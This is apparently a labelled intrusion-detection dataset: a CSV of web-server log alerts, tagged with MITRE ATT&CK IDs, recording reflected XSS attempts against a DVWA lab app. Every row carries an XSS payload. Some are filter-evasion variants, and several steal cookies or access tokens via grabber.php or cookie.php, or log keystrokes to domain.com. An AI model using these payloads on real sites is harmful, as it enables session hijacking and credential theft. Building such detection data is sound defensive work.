timestamp,rule_id,rule_level,data_id,MITRE_ID,MITRE_Tactic,srcip,dstip,full_log,data_protocol,data_url,label
2025-03-31T20:51:58.214+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:56:06 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://localhost/XSS/grabber.php?c='+document.cookie%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://localhost/XSS/grabber.php?c='+document.cookie%3C/script%3E,1
2025-03-31T20:52:04.724+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:56:11 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')%3C/script%3E,1
2025-03-31T20:52:09.063+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:56:16 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Enew%20Image().src=%22http://localhost/cookie.php?c=%22+document.cookie;%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Enew%20Image().src=%22http://localhost/cookie.php?c=%22+document.cookie;%3C/script%3E,1
2025-03-31T20:52:15.571+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:56:21 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Enew%20Image().src=%22http://localhost/cookie.php?c=%22+localStorage.getItem('access_token');%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Enew%20Image().src=%22http://localhost/cookie.php?c=%22+localStorage.getItem('access_token');%3C/script%3E,1
2025-03-31T20:52:19.910+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:56:26 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror='document.onkeypress=function(e)%7Bfetch(%22http://domain.com?k=%22+String.fromCharCode(e.which))%7D,this.remove();'%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror='document.onkeypress=function(e)%7Bfetch(%22http://domain.com?k=%22+String.fromCharCode(e.which))%7D,this.remove();'%3E",1
2025-03-31T20:52:26.412+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:56:31 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edebugger;%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Edebugger;%3C/script%3E,1
2025-03-31T20:52:30.750+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:56:36 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(document.domain.concat(%22%5Cn%22).concat(window.origin))%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(document.domain.concat(%22%5Cn%22).concat(window.origin))%3C/script%3E,1
2025-03-31T20:52:37.251+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:56:41 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Econsole.log(%22Test%20XSS%20from%20the%20search%20bar%20of%20page%20XYZ%5Cn%22.concat(document.domain).concat(%22%5Cn%22).concat(window.origin))%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Econsole.log(%22Test%20XSS%20from%20the%20search%20bar%20of%20page%20XYZ%5Cn%22.concat(document.domain).concat(%22%5Cn%22).concat(window.origin))%3C/script%3E,1
2025-03-31T20:52:41.591+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:56:46 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert('XSS')%3C/script%3E,1
2025-03-31T20:52:48.096+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:56:51 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscr%3Cscript%3Eipt%3Ealert('XSS')%3C/scr%3Cscript%3Eipt%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscr%3Cscript%3Eipt%3Ealert('XSS')%3C/scr%3Cscript%3Eipt%3E,1
2025-03-31T20:52:52.435+0700,31154,10,302,T1059,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:56:56 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E,1
2025-03-31T20:52:58.939+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:57:01 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E",1
2025-03-31T20:53:03.276+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:57:06 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3E%5Cu0061lert('22')%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3E%5Cu0061lert('22')%3C/script%3E,1
2025-03-31T20:53:09.782+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:57:11 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Eeval('%5Cx61lert(%5C'33%5C')')%3C/script%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Eeval('%5Cx61lert(%5C'33%5C')')%3C/script%3E,1
2025-03-31T20:53:14.131+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:57:16 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Eeval(8680439..toString(30))(983801..toString(36))%3C/script%3E%20//parseInt(%22confirm%22,30)%20==%208680439%20&&%208680439..toString(30)%20==%20%22confirm%22 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Eeval(8680439..toString(30))(983801..toString(36))%3C/script%3E%20//parseInt(%22confirm%22,30)%20==%208680439%20&&%208680439..toString(30)%20==%20%22confirm%22",1
2025-03-31T20:53:24.978+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:57:26 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert('XSS');%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert('XSS');%3E,1
2025-03-31T20:53:31.486+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:57:31 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert('XSS')// HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert('XSS')//,1
2025-03-31T20:53:35.829+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:57:36 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert(String.fromCharCode(88,83,83));%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert(String.fromCharCode(88,83,83));%3E",1
2025-03-31T20:53:42.335+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:57:41 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20oneonerrorrror=alert(String.fromCharCode(88,83,83));%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20oneonerrorrror=alert(String.fromCharCode(88,83,83));%3E",1
2025-03-31T20:53:46.673+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:57:46 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x:alert(alt)%20onerror=eval(src)%20alt=xss%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Cimg%20src=x:alert(alt)%20onerror=eval(src)%20alt=xss%3E,1
2025-03-31T20:53:53.182+0700,31154,10,302,T1059,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:57:51 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cimg%20src=x%20onerror=alert('XSS');%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cimg%20src=x%20onerror=alert('XSS');%3E,1
2025-03-31T20:53:57.520+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:57:56 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cimg%20src=x%20onerror=alert(String.fromCharCode(88,83,83));%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%22%3E%3Cimg%20src=x%20onerror=alert(String.fromCharCode(88,83,83));%3E",1
2025-03-31T20:54:04.027+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:58:01 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3C%3E%3Cimg%20src=1%20onerror=alert(1)%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3C%3E%3Cimg%20src=1%20onerror=alert(1)%3E,1
2025-03-31T20:54:08.365+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:58:06 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%20onload=alert(1)%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Csvg%20onload=alert(1)%3E,1
2025-03-31T20:54:19.218+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:58:16 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%20onload=alert(1)// HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Csvg%20onload=alert(1)//,1
2025-03-31T20:54:30.065+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:58:27 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%20id=alert(1)%20onload=eval(id)%3E HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/xss_r/?name=%3Csvg%20id=alert(1)%20onload=eval(id)%3E,1
2025-03-31T20:54:47.425+0700,31105,6,302,T1059.007,Execution,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:06:58:42 -0700] ""GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript%20href=data:,alert(1)%20/%3E(%60Firefox%60%20is%20the%20only%20browser%20which%20allows%20self%20closing%20script) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript%20href=data:,alert(1)%20/%3E(%60Firefox%60%20is%20the%20only%20browser%20which%20allows%20self%20closing%20script)",1
